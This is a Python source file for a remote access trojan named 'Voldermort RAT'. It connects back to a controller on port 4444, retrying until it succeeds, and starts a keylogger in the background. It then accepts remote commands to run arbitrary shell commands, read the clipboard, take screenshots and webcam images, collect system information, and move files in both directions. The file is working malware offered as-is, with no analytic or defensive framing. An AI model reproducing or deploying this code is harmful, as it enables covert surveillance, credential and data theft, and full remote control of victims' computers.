import socket
import platform
import subprocess
import os
import json
import base64
import time
from threading import Thread
from keylogger import start_keylogger
from clipboard import get_clipboard
from screenshot import capture_screenshot
from webcam import capture_webcam
from util import send_file, receive_file

def get_attacker_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        return ip[:ip.rfind(".")+1] + "1"
    except:
        return "127.0.0.1"
    finally:
        s.close()

def reliable_send(s, data):
    json_data = json.dumps(data)
    s.send(json_data.encode())

def reliable_recv(s):
    data = b""
    while True:
        try:
            data += s.recv(1024)
            return json.loads(data)
        except ValueError:
            continue

def run_cmd(command):
    try:
        return subprocess.getoutput(command)
    except Exception as e:
        return f"[!] Command failed: {e}"

def shell(s):
    Thread(target=start_keylogger, daemon=True).start()
    reliable_send(s, "[+] Voldermort RAT connected.")
    while True:
        try:
            command = reliable_recv(s)
            if command == "exit":
                break
            elif command.startswith("cmd "):
                output = run_cmd(command[4:])
                reliable_send(s, output)
            elif command == "systeminfo":
                info = f"{platform.system()} {platform.release()} {platform.processor()}"
                reliable_send(s, info)
            elif command == "clipboard":
                reliable_send(s, get_clipboard())
            elif command == "keylog":
                reliable_send(s, "[+] Keylogger already running.")
            elif command == "screenshot":
                capture_screenshot("screenshot.png")
                send_file(s, "screenshot.png")
            elif command == "webcam":
                capture_webcam("webcam.jpg")
                send_file(s, "webcam.jpg")
            elif command.startswith("download "):
                send_file(s, command.split(" ", 1)[1])
            elif command.startswith("upload "):
                receive_file(s, command.split(" ", 1)[1])
            else:
                reliable_send(s, "[!] Unknown command.")
        except Exception as e:
            reliable_send(s, f"[!] Error: {e}")
            break
    s.close()

def connect_back():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((get_attacker_ip(), 4444))
            shell(s)
            break
        except:
            time.sleep(5)

if __name__ == "__main__":
    connect_back()
